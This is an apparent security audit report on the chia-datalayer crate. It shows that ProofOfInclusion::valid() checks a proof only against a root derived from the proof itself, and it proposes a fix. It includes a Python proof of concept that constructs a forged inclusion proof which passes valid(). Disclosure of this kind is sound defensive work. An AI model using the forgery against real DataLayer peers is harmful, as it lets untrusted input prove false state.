### Title
`ProofOfInclusion::valid()` Verifies Against Self-Derived Root Instead of Trusted External Root, Enabling Forged DataLayer Inclusion Proofs - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` in the DataLayer Merkle proof module performs a tautological final root-hash check: it compares the computed hash against `self.root_hash()`, which is itself derived from the attacker-controlled proof data. No external trusted root is ever consulted. An unprivileged attacker can construct a fully fabricated `ProofOfInclusion` for any arbitrary key/value pair that passes `valid()` without that key/value existing in any real DataLayer tree.

### Finding Description

`ProofOfInclusion::valid()` is implemented as follows:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;
    }

    existing_hash == self.root_hash()
}
``` [1](#0-0) 

And `root_hash()` is:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

**Case 1 — non-empty `layers`:** After the loop completes without returning `false`, `existing_hash` holds the last `calculated_hash`, which was already asserted equal to `layer.combined_hash` inside the loop. `self.root_hash()` returns `layers.last().combined_hash`. Therefore `existing_hash == self.root_hash()` is unconditionally `true` whenever the loop body passes. The final check is dead code.

**Case 2 — empty `layers`:** `existing_hash` = `self.node_hash`; `self.root_hash()` = `self.node_hash`. The check is `self.node_hash == self.node_hash`, always `true`.

In both cases, `valid()` only verifies internal self-consistency of the proof structure. It never compares against any externally supplied, trusted tree root. The function signature takes no trusted-root parameter, and the Python/wasm bindings expose it identically. [3](#0-2) 

The struct is `Streamable` and fully deserializable from bytes, meaning an attacker can craft arbitrary `ProofOfInclusion` objects over the network. [4](#0-3) 

The Python binding exposes `valid()` and `root_hash()` as separate methods, and all existing tests call only `proof.valid()` without separately comparing `proof.root_hash()` against a trusted root: [5](#0-4) 

### Impact Explanation

Any DataLayer client or verifier that calls `proof.valid()` to authenticate a received `ProofOfInclusion` accepts the proof as genuine without binding it to a specific known tree root. An attacker can:

1. Construct a `ProofOfInclusion` with an arbitrary `node_hash` (representing any key/value leaf hash they choose) and a single internally-consistent layer.
2. Call `valid()` — it returns `true`.
3. The verifier accepts that the attacker-chosen key/value is included in a DataLayer tree, even though it is not.

This allows forged DataLayer inclusion proofs, letting untrusted input prove invalid state. This matches the allowed High impact: **DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion or lets untrusted input prove invalid state.**

### Likelihood Explanation

`ProofOfInclusion` is a `Streamable` type exposed through both the Python wheel and wasm bindings. Any peer in the DataLayer sync protocol can send a crafted proof. No privilege, key material, or chain access is required — only the ability to construct a valid-looking byte sequence. The API design (a standalone `valid()` with no root parameter) actively encourages callers to omit the trusted-root comparison.

### Recommendation

`valid()` must accept a trusted root hash as a parameter and compare against it instead of `self.root_hash()`:

```rust
pub fn valid(&self, trusted_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;
    }

    &existing_hash == trusted_root
}
```

All call sites must supply the trusted root obtained from a verified, authoritative source (e.g., the on-chain committed root or a locally computed `MerkleBlob` root), not from the proof itself.

### Proof of Concept

```python
from chia_rs.datalayer import (
    MerkleBlob, ProofOfInclusion, ProofOfInclusionLayer, KeyId, ValueId
)
from chia_rs.sized_ints import uint8
from hashlib import sha256

# Attacker wants to forge a proof that KeyId(999)/ValueId(999) is in the tree,
# but the real tree only contains KeyId(1)/ValueId(1).

# Real tree
real_blob = MerkleBlob(blob=bytearray())
real_hash = bytes(sha256(b"real_leaf").digest())
real_blob.insert(KeyId(1), ValueId(1), real_hash)
real_blob.calculate_lazy_hashes()
trusted_root = real_blob.get_root_hash()

# Attacker constructs a fake leaf hash for KeyId(999)
fake_leaf_hash = bytes(sha256(b"fake_leaf_999").digest())
# Attacker constructs a fake sibling and combined hash
fake_sibling = bytes(sha256(b"fake_sibling").digest())
# combined = sha256(b"\x02" + fake_leaf_hash + fake_sibling)
fake_combined = bytes(sha256(b"\x02" + fake_leaf_hash + fake_sibling).digest())

forged_proof = ProofOfInclusion(
    node_hash=fake_leaf_hash,
    layers=[
        ProofOfInclusionLayer(
            other_hash_side=uint8(1),   # Right
            other_hash=fake_sibling,
            combined_hash=fake_combined,
        )
    ],
)

# valid() returns True even though fake_combined != trusted_root
assert forged_proof.valid(), "Forged proof passes valid()!"
assert forged_proof.root_hash() != trusted_root, "Root does not match real tree"
print("VULNERABILITY CONFIRMED: forged proof accepted by valid()")
```

The forged proof passes `valid()` because the final check compares `existing_hash` (= `fake_combined`) against `self.root_hash()` (= `fake_combined`), which is always equal. The real `trusted_root` is never consulted.
